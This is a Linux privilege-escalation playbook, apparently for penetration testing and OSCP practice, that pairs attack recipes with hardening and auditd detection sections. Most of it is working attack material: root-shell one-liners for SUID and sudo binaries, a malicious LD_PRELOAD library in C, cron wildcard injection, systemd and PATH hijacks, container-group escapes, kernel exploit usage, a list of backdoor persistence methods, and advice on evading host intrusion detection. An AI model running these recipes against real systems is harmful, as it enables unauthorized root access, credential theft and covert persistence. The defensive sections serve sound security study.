## 1. Overview

Linux local privilege escalation (LPE) is the process of moving from a
non-root user to root. The vectors are well-known, stable across
distributions, and frequently present in real environments. Unlike
Windows, Linux has no single "SYSTEM" concept - the target is always
UID 0 (root).

**Vector families:**

- **SUID / SGID binaries** - an executable that runs with the file
  owner's (SUID) or group's (SGID) privileges.
- **Capabilities** - fine-grained privileges granted to a binary
  (`cap_setuid`, `cap_dac_read_search`, `cap_sys_admin`, etc.).
- **sudo misconfigurations** - overly permissive sudoers rules.
- **Cron and timers** - jobs running as root with writable scripts or
  wildcards.
- **systemd units** - services with writable `ExecStart`,
  `EnvironmentFile`, or `WorkingDirectory`.
- **PATH hijacking** - a root process calls a binary by name; PATH
  includes a writable directory.
- **LD_PRELOAD / LD_LIBRARY_PATH** - preload injection via sudo or
  SUID.
- **Credentials** - SSH keys, config files, environment variables,
  history.
- **Kernel** - unpatched CVE.
- **Containers** - Docker socket, privileged containers, host mounts.

**Target outcome:** a shell with `uid=0(root)`, or read access to
`/root/` and `/etc/shadow`.

## 2. Reconnaissance / Enumeration

**Offensive - privilege and group check (always first):**

    id
    whoami
    groups
    sudo -l

    # Look for:
    # - Membership in docker, lxd, disk, adm, sudo groups
    # - Any sudo rule (even for a single binary)
    # - Home directory and shell

**Offensive - SUID / SGID:**

    # SUID binaries
    find / -perm -4000 -type f 2>/dev/null

    # SGID binaries
    find / -perm -2000 -type f 2>/dev/null

    # Compare against distribution default (e.g. Ubuntu has ~20 SUID
    # binaries; anything unusual is worth checking)
    # Check each against GTFOBins: https://gtfobins.github.io/#+suid

**Offensive - capabilities:**

    # Binaries with capabilities
    getcap -r / 2>/dev/null

    # Look for:
    # - cap_setuid (Python, Perl, Ruby, Node)
    # - cap_setgid
    # - cap_dac_read_search (read any file)
    # - cap_dac_override (write any file)
    # - cap_sys_admin (mount, namespace)
    # - cap_sys_ptrace (attach to any process)

**Offensive - sudo:**

    # All sudo rules for current user
    sudo -l

    # Example vulnerable outputs:
    # (root) NOPASSWD: /usr/bin/find
    # (root) NOPASSWD: /usr/bin/vim
    # (root) NOPASSWD: /usr/bin/awk
    # (root) NOPASSWD: /usr/bin/python3
    # (root) NOPASSWD: /usr/bin/env
    # (ALL) NOPASSWD: ALL              <-- trivially exploitable

    # Check sudo version for CVE-2021-3156 (Baron Samedit)
    sudo --version

    # Check for env_keep
    sudo -l | grep -i "env_keep"

**Offensive - cron:**

    cat /etc/crontab
    ls -la /etc/cron.d/
    ls -la /etc/cron.hourly/
    ls -la /etc/cron.daily/
    ls -la /etc/cron.weekly/
    ls -la /etc/cron.monthly/
    cat /etc/cron.d/* 2>/dev/null
    crontab -l
    ls -la /var/spool/cron/crontabs/ 2>/dev/null
    cat /var/spool/cron/crontabs/* 2>/dev/null

    # Monitor in real time
    ./pspy64

**Offensive - systemd:**

    systemctl list-units --type=service
    ls -la /etc/systemd/system/
    ls -la /lib/systemd/system/

    # Look for:
    # - Writable unit files
    # - Writable ExecStart paths
    # - Writable EnvironmentFile
    # - Relative ExecStart (PATH hijack)

    find /etc/systemd/system/ -writable 2>/dev/null
    find /lib/systemd/system/ -writable 2>/dev/null

**Offensive - PATH and environment:**

    # Current PATH
    echo $PATH

    # Writable directories in PATH
    for d in $(echo $PATH | tr ':' ' '); do [ -w "$d" ] && echo "WRITABLE: $d"; done

**Offensive - credentials in files:**

    # SSH keys
    find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null

    # History
    cat ~/.bash_history
    cat ~/.zsh_history

    # Config files with passwords
    grep -r "password" /var/www/ /etc/ /opt/ 2>/dev/null | head

**Offensive - kernel:**

    uname -a
    cat /proc/version

    # Run exploit suggester
    ./linux-exploit-suggester.sh

**Offensive - automated:**

    ./linpeas.sh
    ./LinEnum.sh -t
    ./lse.sh -l 2

## 3. Common Attack Vectors

**Vector selection matrix:**

| Vector | Prerequisite | Noise | Reliability |
|--------|--------------|-------|-------------|
| SSH private key | Read access | None | High |
| Config file credentials | Read access | None | High |
| Sudo misconfiguration | Any sudo rule | Low | High |
| Group membership (docker, lxd, disk) | Group membership | Medium | High |
| Capabilities | Any capability | Medium | High |
| SUID binary (GTFOBins) | SUID binary | Medium | High |
| Cron with writable script | Writable script | Medium | High |
| systemd with writable unit | Writable unit | Medium | High |
| PATH hijacking | Writable PATH dir | Medium | Medium |
| LD_PRELOAD via sudo | env_keep+=LD_PRELOAD | Medium | High |
| Kernel exploit | Unpatched CVE | Very high | Low-medium |

**Preferred order (silent to loud):**

1. Credentials in files (SSH keys, configs, history).
2. Sudo misconfiguration (specific binary via GTFOBins).
3. Group memberships (docker, lxd, disk, adm).
4. Capabilities (cap_setuid, cap_dac_read_search).
5. SUID binary (GTFOBins).
6. Cron with writable script.
7. systemd with writable unit.
8. PATH hijacking.
9. Kernel exploit (last resort).

**Group membership shortcuts (often overlooked):**

- `docker` group = root via Docker socket.
- `lxd` / `lxc` group = root via container mount.
- `disk` group = raw disk access, read `/etc/shadow`.
- `adm` group = read system logs (may contain credentials).
- `sudo` group = probably has sudo rules.

## 4. Exploitation Recipes

**SUID bash (classic):**

    # 1. Find SUID bash
    find / -perm -4000 -type f -name bash 2>/dev/null

    # 2. Exploit
    /bin/bash -p

    # Expected output:
    # # id
    # uid=0(root) gid=0(root) groups=0(root)

**SUID find:**

    find . -exec /bin/sh -p \; -quit

    # Expected output: root shell

**SUID vim / vi:**

    vim -c ':!/bin/sh'

    # Inside vim: :!/bin/sh (or :shell)
    # Expected output: root shell

**SUID nmap (older versions):**

    # For nmap with SUID (interactive mode, older versions)
    nmap --interactive
    nmap> !sh

    # Expected output: root shell

**SUID less / more:**

    less /etc/passwd
    # Inside less:
    !/bin/sh
    # Expected output: root shell

**SUID cp (copy /etc/shadow):**

    # 1. Copy /etc/shadow to a readable location
    cp /etc/shadow /tmp/shadow.bak 2>/dev/null || \
    LFILE=/etc/shadow
    /usr/bin/cp $LFILE /tmp/shadow.bak

    # 2. Read as user
    cat /tmp/shadow.bak

**Capabilities - cap_setuid on Python:**

    # 1. Confirm
    getcap -r / 2>/dev/null
    # /usr/bin/python3.9 = cap_setuid+ep

    # 2. Exploit
    python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'

    # Expected output: root shell

**Capabilities - cap_dac_read_search on tar:**

    # 1. Confirm
    getcap -r / 2>/dev/null
    # /usr/bin/tar = cap_dac_read_search+ep

    # 2. Read /etc/shadow
    tar -czf /tmp/shadow.tar.gz /etc/shadow 2>/dev/null
    tar -xzf /tmp/shadow.tar.gz -C /tmp
    cat /tmp/etc/shadow

**Sudo - specific binary via GTFOBins:**

    # 1. List sudo rules
    sudo -l

    # Example: (root) NOPASSWD: /usr/bin/find

    # 2. Exploit
    sudo find . -exec /bin/sh \; -quit
    # Or: sudo find / -exec /bin/bash -p \; -quit

**Sudo - vim:**

    sudo vim -c ':!/bin/sh'

**Sudo - awk:**

    sudo awk 'BEGIN {system("/bin/sh")}'

**Sudo - python3:**

    sudo python3 -c 'import os; os.system("/bin/bash")'

**Sudo - env:**

    sudo env /bin/bash

**Sudo - LD_PRELOAD:**

    # 1. Check env_keep
    sudo -l | grep -i "env_keep+=LD_PRELOAD"

    # 2. Create malicious shared library
    cat > /tmp/exploit.c <<'EOF'
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
    }
    EOF
    gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles

    # 3. Run any sudo command with LD_PRELOAD
    sudo LD_PRELOAD=/tmp/exploit.so <any-allowed-command>

    # Expected output: root shell

**Cron - writable script:**

    # 1. Identify a cron job running a writable script
    cat /etc/crontab
    # Example: */5 * * * * root /home/user/backup.sh

    # 2. Check the script's permissions
    ls -la /home/user/backup.sh
    # If writable by current user:

    # 3. Append payload
    echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /home/user/backup.sh

    # 4. Wait for cron, then exploit
    /tmp/rootbash -p

**Cron - wildcard injection (tar):**

    # 1. Identify a cron job with a wildcard in a writable directory
    cat /etc/crontab
    # Example: */5 * * * * root cd /home/user && tar czf /tmp/backup.tar.gz *

    # 2. Plant files with crafted names
    cd /home/user
    echo "" > "--checkpoint-action=exec=sh shell.sh"
    echo "" > "--checkpoint=1"
    cat > shell.sh <<'EOF'
    #!/bin/bash
    cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
    EOF
    chmod +x shell.sh

    # 3. Wait for cron, then exploit
    /tmp/rootbash -p

**systemd - writable unit file:**

    # 1. Find writable unit
    find /etc/systemd/system/ /lib/systemd/system/ -writable 2>/dev/null

    # 2. Modify ExecStart to point to a payload
    # (if unit is writable)
    sed -i 's|ExecStart=.*|ExecStart=/tmp/payload.sh|' /etc/systemd/system/vuln.service

    # Or if ExecStart binary is writable:
    ls -la $(systemctl show -p ExecStart vuln.service | grep -oP 'path=\K[^ ;]+')

    # 3. Reload and restart
    systemctl daemon-reload
    systemctl restart vuln.service

**PATH hijacking:**

    # 1. Find a service or SUID binary that calls a command by name
    strings /path/to/binary | grep -i "/bin\|/usr/bin"
    # Or watch systemd service scripts

    # Example: a service calls `ps` without full path

    # 2. Add writable directory to PATH
    export PATH=/tmp:$PATH
    echo '#!/bin/bash' > /tmp/ps
    echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/ps
    chmod +x /tmp/ps

    # 3. Trigger the service
    # (restart, wait for cron, etc.)

    # 4. Exploit
    /tmp/rootbash -p

**Group membership - docker:**

    # 1. Check group
    id | grep docker

    # 2. Mount the host filesystem in a privileged container
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh

    # Expected output: root shell on the host

**Group membership - lxd / lxc:**

    # 1. Check group
    id | grep -E "lxd|lxc"

    # 2. Initialize LXD (if not already)
    lxd init --auto

    # 3. Launch a privileged container with the host filesystem mounted
    lxc launch images:alpine/3.18 privesc -c security.privileged=true
    lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

    # 4. Execute inside, chroot, and add SUID to bash
    lxc exec privesc -- /bin/sh -c 'chroot /mnt/root /bin/bash -c "chmod u+s /bin/bash"'

    # 5. On the host
    /bin/bash -p

**Group membership - disk:**

    # 1. Check group
    id | grep disk

    # 2. Find the disk device
    ls -la /dev/sd*

    # 3. Read the raw disk (find the shadow file offset with debugfs)
    debugfs /dev/sda1
    debugfs: cat /etc/shadow

    # Or use debugfs's dump command to extract shadow

**Kernel - PwnKit (CVE-2021-4034):**

    # 1. Check pkexec
    pkexec --version

    # 2. If vulnerable (polkit < 0.120, most distros before 2022)
    # Download and compile the public exploit
    # (e.g. https://github.com/berdav/CVE-2021-4034)
    gcc cve-2021-4034-poc.c -o cve-2021-4034
    ./cve-2021-4034

    # Expected output: root shell

**Kernel - Dirty Pipe (CVE-2022-0847):**

    # Kernel 5.8 - 5.16.11
    # Public exploit: https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
    ./dirtypipez /usr/bin/su
    # Then: su root (with any password) -> root shell

**Kernel - sudo Baron Samedit (CVE-2021-3156):**

    # Sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
    sudoedit -s '\' $(python3 -c 'print("A"*1000)')
    # Or use public exploit:
    # https://github.com/blasty/CVE-2021-3156

## 5. Post-Exploitation

**After escalating to root:**

- Dump `/etc/shadow` for all user hashes.
- Search for SSH keys in all home directories.
- Search for credentials in config files (web, DB, cloud).
- Search for cloud metadata service (`169.254.169.254`).
- Search for Kubernetes service account tokens.
- Enumerate mounted filesystems and NFS shares.
- Enumerate containers (if not already known).
- Check for other users' SSH agent sockets.
- Check `/root/.bash_history`.

**Persistence as root:**

- Cron job (system-level).
- systemd service or timer.
- SSH authorized_keys.
- PAM module (backdoor).
- LD_PRELOAD in `/etc/ld.so.preload`.
- Kernel module.
- SUID binary (backdoor).

**After getting a new shell as non-root:**

- Re-run linPEAS - the new context may unlock new vectors.
- Check group memberships again.
- Check the new user's home directory for credentials.

## 6. Risk Context

Linux LPE is a reliable path to root in most environments because the
misconfigurations that enable it are extremely common:

- SUID binaries accumulate over years.
- Capabilities are granted for convenience and never audited.
- sudoers rules are rarely reviewed.
- Cron jobs run scripts from user-writable directories.
- Group memberships (docker, lxd, disk) are granted for convenience.

**Blast radius:** root on a Linux host grants access to all local data,
all credentials, all SSH keys, and often the entire network segment
(via pivot).

**Why attacks succeed:**

- Misconfigurations persist for years.
- HIDS is often absent on Linux servers.
- Administrators underestimate the impact of group memberships.
- Patch management is incomplete.

## 7. Root Causes

- **Legacy packages.** SUID binaries from old software.
- **Convenience over security.** Capabilities granted broadly.
- **Weak cron hygiene.** Scripts in user-writable directories.
- **Over-permissive sudoers.** Specific commands without argument
  restrictions.
- **Group membership sprawl.** docker, lxd, disk granted broadly.
- **Credentials in files.** Config, history, environment.
- **Missing patches.** Kernel CVEs.
- **No baseline.** Misconfigurations are invisible without a baseline.

## 8. Preventive Controls

**Permission hardening:**

- Audit SUID/SGID binaries; remove unneeded SUID bits.
- Restrict capabilities to minimum required.
- Restrict write access to system directories.

**sudo hardening:**

- Specific commands, not wildcards.
- `Defaults secure_path`.
- Avoid `env_keep+=LD_PRELOAD`.
- Patch sudo.

**Cron hardening:**

- Restrict cron scripts to root-owned directories.
- Avoid wildcards in cron commands.
- Use absolute paths in scripts.

**systemd hardening:**

- Use systemd hardening options (`NoNewPrivileges=yes`,
  `ProtectSystem=strict`, `PrivateTmp=yes`, `ProtectHome=yes`).
- Restrict unit file permissions.
- Avoid running services as root.

**Group hardening:**

- Restrict `docker` group membership to administrators.
- Restrict `lxd` group membership.
- Restrict `disk` group membership.
- Audit group memberships quarterly.

**Credential hygiene:**

- No plaintext credentials in config files.
- SSH keys with passphrases; `0600` permissions.
- Rotate keys and passwords.
- Clear `.bash_history` before deployment.

**Patch management:**

- Patch kernel and packages within days.
- Enable automatic security updates.

**Monitoring:**

- Enable auditd.
- Forward logs to a SIEM.
- Baseline and alert on SUID/SGID changes, capability changes,
  cron/systemd changes, SSH key changes, group membership changes.

## 9. Detection Controls

**SUID/SGID exploitation:**

- auditd: `-a always,exit -F arch=b64 -S execve -F euid=0 -F uid!=0
  -k suid_exec`
- Alert on SUID binaries executing shells.

**Capabilities abuse:**

- auditd: `-a always,exit -F arch=b64 -S capset -k cap_mod`
- Alert on `setcap` usage.

**Sudo abuse:**

- auditd: `-w /usr/bin/sudo -p x -k sudo`
- `/var/log/auth.log` (Debian) or `/var/log/secure` (RHEL).
- Alert on unusual sudo commands.

**Cron abuse:**

- auditd: `-w /etc/cron* -p wa -k cron`
- auditd: `-w /var/spool/cron -p wa -k cron`
- Alert on new cron entries.

**systemd abuse:**

- auditd: `-w /etc/systemd/system/ -p wa -k systemd`
- Alert on `systemctl daemon-reload` from unusual users.

**Group membership abuse:**

- auditd: `-w /etc/group -p wa -k group_mod`
- Alert on docker/lxd/disk group modifications.
- Monitor `docker run --privileged` in audit logs.

**Kernel exploits:**

- Alert on crash dumps.
- Monitor for unexpected kernel module loads.
- Auditd rule on `init_module` and `finit_module` syscalls.

**Credentials access:**

- auditd: `-w /etc/shadow -p r -k shadow_read`
- auditd: `-w /root/.ssh -p rwa -k root_ssh`

**General:**

- AIDE / Tripwire for file integrity.
- OSSEC / Wazuh for HIDS.
- Falco for container runtime security.
- Sysmon for Linux.

## 10. Verification

**Offensive - did LPE succeed?**

- `id` returns `uid=0(root) gid=0(root)`.
- Read `/etc/shadow` (proves root-level access).
- Write to `/root/` (proves full root).

**Defensive - are controls effective?**

- No unexpected SUID binaries (baseline comparison).
- No unexpected capabilities (baseline comparison).
- sudoers rules are specific and argument-restricted.
- Cron scripts are root-owned and not writable.
- systemd units are not writable; ExecStart paths are absolute.
- `docker`, `lxd`, `disk` group memberships are restricted.
- No credentials in config files (search + manual review).
- Kernel and packages current within 30 days.
- auditd rules loaded and forwarded to SIEM.

## 11. OSCP Notes

- Linux LPE is a common OSCP requirement. Practice each vector.
- Preferred tools: linPEAS, LinEnum, pspy, linux-exploit-suggester.
- Preferred exploits: GTFOBins for SUID/sudo, linux-exploit-suggester
  for kernel.
- **Capture screenshots** of:
  - `id` and `sudo -l` output.
  - The misconfiguration (SUID binary, sudo rule, cron job).
  - The exploitation command and the resulting root shell.
  - `id` showing `uid=0(root)`.
- The `> [!IMPORTANT]` OSCP reporting note applies to the LPE step.

## 12. Production Notes

- Linux LPE tools (linPEAS, LinEnum) are heavily signatured; modern
  HIDS blocks them at runtime.
- Use targeted manual checks (id, sudo -l, find) instead of full
  enumeration tools.
- Kernel exploits are very loud and may crash the system; use as last
  resort.
- Credential hunting in files is the quietest vector; prioritize it.
- Group membership abuse (docker, lxd, disk) is often overlooked by
  defenders; exploit it when available.
- Assume HIDS is present; plan for speed and silence.

## 13. References

**Linux documentation:**

- Linux man pages - https://man7.org/linux/man-pages/
- Linux capabilities - https://man7.org/linux/man-pages/man7/capabilities.7.html
- sudoers manual - https://www.sudo.ws/docs/man/sudoers.man/
- systemd.exec hardening options - https://www.freedesktop.org/software/systemd/man/systemd.exec.html

**MITRE ATT&CK:**

- Privilege Escalation - Exploitation for Privilege Escalation (T1068) - https://attack.mitre.org/techniques/T1068/
- Privilege Escalation - Abuse Elevation Control Mechanism: Sudo and Sudo Caching (T1548.003) - https://attack.mitre.org/techniques/T1548/003/
- Privilege Escalation - Abuse Elevation Control Mechanism: Setuid and Setgid (T1548.001) - https://attack.mitre.org/techniques/T1548/001/
- Execution - Command and Scripting Interpreter: Unix Shell (T1059.004) - https://attack.mitre.org/techniques/T1059/004/

**Tools:**

- linPEAS - https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- LinEnum - https://github.com/rebootuser/LinEnum
- pspy - https://github.com/DominicBreuker/pspy
- linux-exploit-suggester - https://github.com/mzet-/linux-exploit-suggester
- GTFOBins - https://gtfobins.github.io/

**Research:**

- HackTricks - Linux Privilege Escalation - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- PayloadsAllTheThings - Linux Privilege Escalation - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- GTFOBins - https://gtfobins.github.io/
